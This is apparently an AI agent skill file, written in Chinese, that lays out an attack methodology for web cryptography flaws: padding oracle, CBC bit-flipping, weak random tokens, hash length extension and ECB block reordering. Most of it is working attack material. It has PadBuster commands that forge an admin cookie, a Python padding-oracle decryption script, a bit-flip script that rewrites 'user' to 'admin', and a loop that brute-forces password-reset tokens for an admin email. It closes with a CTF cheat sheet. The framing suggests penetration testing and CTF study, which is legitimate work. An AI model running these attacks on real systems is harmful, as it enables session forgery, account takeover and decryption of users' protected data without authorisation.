---
name: crypto-web-attack
description: "Web 应用中的密码学攻击。当发现 Padding Oracle 错误信息、CBC 模式加密的 Token、可预测的随机数/Token、哈希长度扩展攻击机会时使用。覆盖 Padding Oracle（含 PadBuster 完整用法）、CBC bit-flip、弱随机数、哈希长度扩展、ECB 块重排。注意：JWT 攻击请使用 jwt-attack-methodology，Cookie 分析请使用 cookie-analysis"
metadata:
  tags: "crypto,padding oracle,cbc,bit-flip,hash,hmac,random,token,密码学,加密,解密,forgery,加密攻击,magic hash,type juggling,弱类型,PHP弱比较,0e,ecb,aes,padbuster,hashpump"
  category: "exploit"
---

# Web 密码学攻击方法论

Web 应用中的密码学攻击不需要破解算法本身，而是利用**实现缺陷**——错误信息泄露、可预测的随机数、不当的加密模式使用。

## ⛔ 深入参考（必读）

- Padding Oracle/CBC Bit-flip 详细利用、弱随机数脚本、哈希长度扩展 → [references/crypto-techniques.md](references/crypto-techniques.md)

## Phase 1: Padding Oracle Attack

**识别**：解密失败时返回不同错误（200 vs 500 vs 302）。入口：加密 Cookie、加密 URL 参数。

**关键特征**：
- 修改密文某字节 → 返回 500 (padding error)
- 修改密文另一字节 → 返回 200 或 302 (padding correct but data wrong)
- 不同响应 = Oracle 存在

### PadBuster 工具用法（首选）

```bash
# 安装（Perl 脚本）
apt install padbuster
# 或
git clone https://github.com/AonCyberLabs/PadBuster.git

# 1. 解密已有密文
padbuster http://target/api ENCRYPTED_TOKEN 16 -encoding 0
# 参数说明：
#   ENCRYPTED_TOKEN = 要解密的密文（hex 或 base64）
#   16 = block size（AES=16, DES=8）
#   -encoding 0 = hex, 1 = lowercase hex, 2 = base64, 3 = URL-encoded base64, 4 = Web-safe base64

# 2. Cookie 中的 Padding Oracle
padbuster http://target/ COOKIE_VALUE 16 \
    -cookies "session=COOKIE_VALUE" \
    -encoding 2  # base64

# 3. 加密自定义明文（伪造 Cookie）
padbuster http://target/ COOKIE_VALUE 16 \
    -cookies "session=COOKIE_VALUE" \
    -encoding 2 \
    -plaintext '{"user":"admin","role":"admin"}'

# 4. POST 请求中的 Padding Oracle
padbuster http://target/decrypt ENCRYPTED 16 \
    -post "data=ENCRYPTED" \
    -encoding 0

# 5. 指定 error pattern（非标准错误响应）
padbuster http://target/ TOKEN 16 \
    -error "Invalid padding" \
    -encoding 0
```

### Python 手动 Padding Oracle（PadBuster 不可用时）

```python
#!/usr/bin/env python3
"""Padding Oracle 解密脚本"""
import requests

URL = "http://target/api"
BLOCK_SIZE = 16  # AES

def oracle(ciphertext_hex):
    """发送密文，判断 padding 是否正确"""
    r = requests.get(f"{URL}?token={ciphertext_hex}")
    # 根据实际情况调整判断条件
    return r.status_code != 500  # 500=padding error, 200=padding OK

def decrypt_block(prev_block, curr_block):
    """解密单个 block"""
    intermediate = bytearray(BLOCK_SIZE)
    plaintext = bytearray(BLOCK_SIZE)

    for pos in range(BLOCK_SIZE - 1, -1, -1):
        padding_val = BLOCK_SIZE - pos
        # 设置已知的 intermediate 值
        test = bytearray(BLOCK_SIZE)
        for k in range(pos + 1, BLOCK_SIZE):
            test[k] = intermediate[k] ^ padding_val

        for guess in range(256):
            test[pos] = guess
            test_hex = (bytes(test) + bytes(curr_block)).hex()
            if oracle(test_hex):
                intermediate[pos] = guess ^ padding_val
                plaintext[pos] = intermediate[pos] ^ prev_block[pos]
                break

    return bytes(plaintext)

# 使用：将密文按 BLOCK_SIZE 分块，逐块解密
```

→ 完整原理和更多场景 → [references/crypto-techniques.md](references/crypto-techniques.md)

## Phase 2: CBC Bit-Flip Attack

修改第 N 个密文 block 字节 → 精确翻转第 N+1 个明文 block 对应字节。

**核心公式**：`cipher[offset] ^= ord(原字符) ^ ord(目标字符)`

### 实操脚本

```python
import base64

token = "BASE64_ENCRYPTED_COOKIE"
cipher = bytearray(base64.b64decode(token))

# 目标：将 "user" 翻转为 "admin" (假设在第二个 block)
# 修改第一个 block 的对应字节
offset = 0  # 根据实际明文位置计算
cipher[offset]     ^= ord('u') ^ ord('a')
cipher[offset + 1] ^= ord('s') ^ ord('d')
cipher[offset + 2] ^= ord('e') ^ ord('m')
cipher[offset + 3] ^= ord('r') ^ ord('i')
# 注意：第一个 block 的明文会被破坏（变成垃圾），但第二个 block 被精确修改

new_token = base64.b64encode(cipher).decode()
print(f"Forged token: {new_token}")
```

**注意**：被修改的 block 对应的明文会变成垃圾。如果应用检查该 block 的数据，攻击会失败。

→ 详细利用 → [references/crypto-techniques.md](references/crypto-techniques.md)

## Phase 3: 弱随机数 / 可预测 Token

**识别**：密码重置 Token 基于时间戳？Session ID 递增？CSRF Token 可预测？

### 时间戳爆破

```python
import hashlib, time, requests

target_email = "admin@target.com"
# 获取"重置密码"请求的时间戳附近
reset_time = int(time.time())
for ts in range(reset_time - 60, reset_time + 60):
    token = hashlib.md5(f"{ts}{target_email}".encode()).hexdigest()
    r = requests.get(f"http://target/reset?token={token}")
    if r.status_code == 200 and 'expired' not in r.text:
        print(f"[+] Valid token: {token} (timestamp: {ts})")
        break
```

### PHP mt_rand() 预测

```bash
# PHP 的 mt_rand() 可从输出推断种子
# 工具：php_mt_seed
php_mt_seed OUTPUT_VALUE
# 得到种子后预测后续输出
```

## Phase 4: 哈希长度扩展

**适用条件**：
- 服务端使用 `H(secret + message)` 签名（MD5/SHA1/SHA256）
- 你知道 `message` 和 `H(secret + message)`
- 你不知道 `secret`

### HashPump 使用

```bash
# 安装
apt install hashpump
# 或 pip install hashpumpy

# 使用
hashpump -s ORIGINAL_HASH -d 'original_data' -a '&admin=true' -k SECRET_LENGTH
# SECRET_LENGTH 需要暴力枚举（通常 8-32）

# Python 版
import hashpumpy
for key_len in range(8, 33):
    new_hash, new_data = hashpumpy.hashpump(
        original_hash, 'original_data', '&admin=true', key_len
    )
    # 用 new_hash 和 new_data 发送请求测试
```

**不适用**：HMAC、SHA-3、BLAKE2。

## Phase 5: CTF 速查表

| 看到什么 | 方向 | 工具 |
|----------|------|------|
| 加密 Cookie + 不同错误 | Padding Oracle | `padbuster` |
| `role=user` 加密 Cookie | CBC Bit-flip | Python XOR 脚本 |
| 密码重置 + 短 Token | 弱随机数 | 时间戳暴力脚本 |
| `sign=md5hash` | 哈希长度扩展 | `hashpump` |
| `eyJ...` Base64 JSON | JWT | jwt爆破工具 |
| PHP `mt_rand()` | 种子预测 | `php_mt_seed` |
| AES-ECB Cookie | ECB 块重排 | 手动 cut-and-paste |

